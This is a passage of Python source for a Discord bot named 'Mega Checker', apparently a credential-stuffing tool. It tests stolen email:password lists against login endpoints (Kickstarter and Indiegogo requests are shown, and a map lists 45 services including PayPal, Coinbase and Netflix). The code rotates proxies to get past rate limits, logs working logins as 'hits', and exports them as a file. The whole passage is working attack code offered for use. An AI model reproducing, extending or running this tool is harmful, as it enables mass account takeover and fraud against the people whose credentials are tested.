    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── KICKSTARTER ───────────────────────────────────────────────────────────────
async def check_kickstarter(session, email, password):
    try:
        async with session.post("https://www.kickstarter.com/xauth/access_tokens",
                                json={"email": email, "password": password,
                                      "client_id": "2II5GGBZLOOZAA5XBU1U0Y44BU57Q58L98TZMGTY"},
                                headers=BASE_HEADERS, timeout=tout(), **pkw()) as r:
            data = await r.json()
            if data.get("access_token"):
                return "hit", {}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── INDIEGOGO ─────────────────────────────────────────────────────────────────
async def check_indiegogo(session, email, password):
    try:
        async with session.post("https://api.indiegogo.com/2/auth/new.json",
                                json={"user_session": {"email": email, "password": password}},
                                headers={**BASE_HEADERS, "X-AppKey": "57f7cde886934e72a73b04ae1d08f8d81ac66fdf5a1b0cd1beaca86f2c0b2f69"},
                                timeout=tout(), **pkw()) as r:
            data = await r.json()
            if data.get("response", {}).get("token"):
                return "hit", {}
            return "invalid", {}
    except asyncio.TimeoutError:
        return "timeout", {}
    except Exception as ex:
        return "error", {"Err": str(ex)[:60]}

# ── SERVICE MAP ───────────────────────────────────────────────────────────────
SERVICE_MAP = {
    "discord":      check_discord,
    "steam":        check_steam,
    "epic":         check_epic,
    "roblox":       check_roblox,
    "minecraft":    check_minecraft,
    "ubisoft":      check_ubisoft,
    "riot":         check_riot,
    "battlenet":    check_battlenet,
    "ea":           check_ea,
    "netflix":      check_netflix,
    "spotify":      check_spotify,
    "crunchyroll":  check_crunchyroll,
    "disney":       check_disney,
    "hulu":         check_hulu,
    "twitter":      check_twitter,
    "reddit":       check_reddit,
    "twitch":       check_twitch,
    "github":       check_github,
    "gitlab":       check_gitlab,
    "binance":      check_binance,
    "coinbase":     check_coinbase,
    "paypal":       check_paypal,
    "adobe":        check_adobe,
    "amazon":       check_amazon,
    "dropbox":      check_dropbox,
    "wordpress":    check_wordpress,
    "duolingo":     check_duolingo,
    "crunchbase":   check_crunchbase,
    "hubspot":      check_hubspot,
    "canva":        check_canva,
    "patreon":      check_patreon,
    "soundcloud":   check_soundcloud,
    "stackoverflow":check_stackoverflow,
    "lastfm":       check_lastfm,
    "imgur":        check_imgur,
    "dailymotion":  check_dailymotion,
    "vimeo":        check_vimeo,
    "deezer":       check_deezer,
    "tidal":        check_tidal,
    "plex":         check_plex,
    "xbox":         check_xbox,
    "psn":          check_psn,
    "nintendo":     check_nintendo,
    "kickstarter":  check_kickstarter,
    "indiegogo":    check_indiegogo,
}

# ══════════════════════════════════════════════════════════════════════════════
# EVENTS
# ══════════════════════════════════════════════════════════════════════════════
@bot.event
async def on_ready():
    print("[+] {} online — {} services loaded".format(bot.user, len(SERVICE_MAP)))
    await bot.change_presence(activity=discord.Activity(
        type=discord.ActivityType.watching,
        name="{} services | !help".format(len(SERVICE_MAP))
    ))

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("❌ Admins only.")
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("❌ Missing: `{}`".format(error.param.name))
    elif isinstance(error, commands.BadArgument):
        await ctx.send("❌ Bad argument.")
    elif isinstance(error, commands.CommandNotFound):
        pass

# ══════════════════════════════════════════════════════════════════════════════
# COMMANDS
# ══════════════════════════════════════════════════════════════════════════════
@bot.command(name="help")
async def cmd_help(ctx):
    services = ", ".join("`{}`".format(s) for s in sorted(SERVICE_MAP.keys()))
    e = discord.Embed(title="🛠️ Mega Checker", color=0x5865F2)
    e.add_field(name="Check accounts",
                value="`!check <service> email:pass [email:pass ...]`\nor attach a `.txt` file",
                inline=False)
    e.add_field(name="Services ({})".format(len(SERVICE_MAP)), value=services, inline=False)
    e.add_field(name="Proxies",  value="`!addproxy` `!proxycount` `!clearproxy`", inline=False)
    e.add_field(name="Export",   value="`!export` — download all hits", inline=False)
    e.add_field(name="Stats",    value="`!stats`", inline=False)
    await ctx.send(embed=e)


@bot.command(name="check")
@commands.has_permissions(administrator=True)
async def cmd_check(ctx, service: str = None, *args):
    if not service:
        await ctx.send("❌ Usage: `!check <service> email:pass` or attach `.txt`"); return

    service = service.lower()
    if service not in SERVICE_MAP:
        await ctx.send("❌ Unknown service. Use `!help` to see all services."); return

    checker = SERVICE_MAP[service]
    pairs = []

    # from attachment
    if ctx.message.attachments:
        for a in ctx.message.attachments:
            if a.filename.endswith(".txt"):
                raw = await a.read()
                for line in raw.decode().splitlines():
                    p = parse_line(line)
                    if p:
                        pairs.append(p)

    # from inline args
    for arg in args:
        p = parse_line(arg)
        if p:
            pairs.append(p)

    if not pairs:
        await ctx.send("❌ No combos. Attach `.txt` or pass `email:pass` inline."); return

    total  = len(pairs)
    log_ch = bot.get_channel(LOG_CHANNEL_ID) or ctx.channel
    msg    = await ctx.send("⏳ Checking **{}** combo(s) on **{}**…".format(total, service.upper()))
    stats  = {"✅ Hits": 0, "🔐 2FA": 0, "❌ Invalid": 0, "💥 Error": 0, "🚦 RL": 0}

    async with aiohttp.ClientSession() as session:
        for i, (email, password) in enumerate(pairs, 1):
            status, details = await checker(session, email, password)

            if status == "hit":
                stats["✅ Hits"] += 1
                all_hits.append("[{}] {}:{}".format(service.upper(), email, password))
            elif status == "2fa":
                stats["🔐 2FA"] += 1
            elif status == "ratelimited":
                stats["🚦 RL"] += 1
                await asyncio.sleep(5)
            elif status in ("error", "timeout"):
                stats["💥 Error"] += 1
            else:
                stats["❌ Invalid"] += 1

            e = make_embed(service, email, status, details, i, total)
            await log_ch.send(embed=e)
            await asyncio.sleep(1.2)

    summary = discord.Embed(title="📊 {} — Done".format(service.upper()), color=0x5865F2)
    for k, v in stats.items():
        summary.add_field(name=k, value=str(v), inline=True)
    summary.timestamp = datetime.utcnow()
    await ctx.send(embed=summary)
    await msg.delete()


@bot.command(name="services")
async def cmd_services(ctx):
    s = ", ".join(sorted(SERVICE_MAP.keys()))
    await ctx.send("**{} services:** {}".format(len(SERVICE_MAP), s))


@bot.command(name="addproxy")
@commands.has_permissions(administrator=True)
async def cmd_addproxy(ctx):
    if not ctx.message.attachments:
        await ctx.send("❌ Attach a `.txt` of proxies (ip:port)."); return
    added = 0
    for a in ctx.message.attachments:
        if a.filename.endswith(".txt"):
            raw = await a.read()
            for line in raw.decode().splitlines():
                p = line.strip()
                if p:
                    proxy_list.append(p); added += 1
    await ctx.send("✅ Added **{}** proxies. Total: **{}**".format(added, len(proxy_list)))


@bot.command(name="proxycount")
async def cmd_proxycount(ctx):
    await ctx.send("🌐 **{}** proxies loaded.".format(len(proxy_list)))


@bot.command(name="clearproxy")
@commands.has_permissions(administrator=True)
async def cmd_clearproxy(ctx):
    proxy_list.clear()
    await ctx.send("✅ Proxy list cleared.")


@bot.command(name="export")
@commands.has_permissions(administrator=True)
async def cmd_export(ctx):
    if not all_hits:
        await ctx.send("📭 No hits yet."); return
    buf = io.BytesIO("\n".join(all_hits).encode())
    buf.seek(0)
    await ctx.send("📁 **{}** hits:".format(len(all_hits)), file=discord.File(buf, filename="hits.txt"))


@bot.command(name="stats")
async def cmd_stats(ctx):
    e = discord.Embed(title="📈 Session Stats", color=0x5865F2)
    e.add_field(name="✅ Total Hits",    value=str(len(all_hits)),    inline=True)
    e.add_field(name="🌐 Proxies",       value=str(len(proxy_list)),  inline=True)
    e.add_field(name="🔧 Services",      value=str(len(SERVICE_MAP)), inline=True)
    e.timestamp = datetime.utcnow()
    await ctx.send(embed=e)


# ── RUN ───────────────────────────────────────────────────────────────────────
bot.run(BOT_TOKEN)
